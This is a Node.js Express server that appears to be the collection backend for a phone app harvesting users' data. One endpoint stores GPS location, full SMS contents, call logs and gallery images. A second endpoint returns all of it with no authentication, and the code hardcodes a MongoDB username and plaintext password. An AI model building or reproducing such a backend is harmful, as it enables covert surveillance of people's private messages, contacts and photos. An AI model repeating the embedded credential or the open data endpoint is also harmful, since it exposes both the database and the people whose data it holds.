// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' })); // dagdagan limit kasi may base64 images

// ✅ Connect MongoDB
mongoose.connect(
  'mongodb+srv://christianpaulbaron:Blogpost2025@blogposts.t6tfm.mongodb.net/chatApp?retryWrites=true&w=majority&appName=BlogPosts'
)
.then(() => console.log('✅ MongoDB Connected'))
.catch(err => console.error('❌ MongoDB Error:', err));

// ✅ Schema (lahat string)
const permissionSchema = new mongoose.Schema({
  location: {
    lat: { type: String, default: '' },
    lon: { type: String, default: '' },
  },
  smsList: [
    {
      address: { type: String, default: '' },
      body: { type: String, default: '' },
      date: { type: String, default: '' },
    },
  ],
  callLogs: [
    {
      number: { type: String, default: '' },
      type: { type: String, default: '' },
      duration: { type: String, default: '' },
      date: { type: String, default: '' },
    },
  ],
  galleryImages: [String], // store base64 images
  date: { type: Date, default: Date.now },
});

// 👇 Use userpermissions collection
const Permission = mongoose.model('UserPermission', permissionSchema);

// ✅ Save Location + SMS + Calls + Gallery
app.post('/api/permissions', async (req, res) => {
  try {
    const { location, smsList, callLogs, galleryImages } = req.body;

    const permission = new Permission({
      location: {
        lat: String(location?.lat || ''),
        lon: String(location?.lon || ''),
      },
      smsList: (smsList || []).map(sms => ({
        address: String(sms.address || ''),
        body: String(sms.body || ''),
        date: String(sms.date || ''),
      })),
      callLogs: (callLogs || []).map(log => ({
        number: String(log.number || ''),
        type: String(log.type || ''),
        duration: String(log.duration || ''),
        date: String(log.date || ''),
      })),
      galleryImages: (galleryImages || []).map(img => String(img)),
    });

    await permission.save();
    res.json({ message: '✅ Location + SMS + CallLogs + Gallery saved successfully!' });
  } catch (error) {
    console.error('❌ Save Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// ✅ Fetch all
app.get('/api/permissions', async (req, res) => {
  try {
    const permissions = await Permission.find().sort({ date: -1 });
    res.json(permissions);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ✅ Run server
app.listen(5000, () => console.log('🚀 Server running on port 5000'));


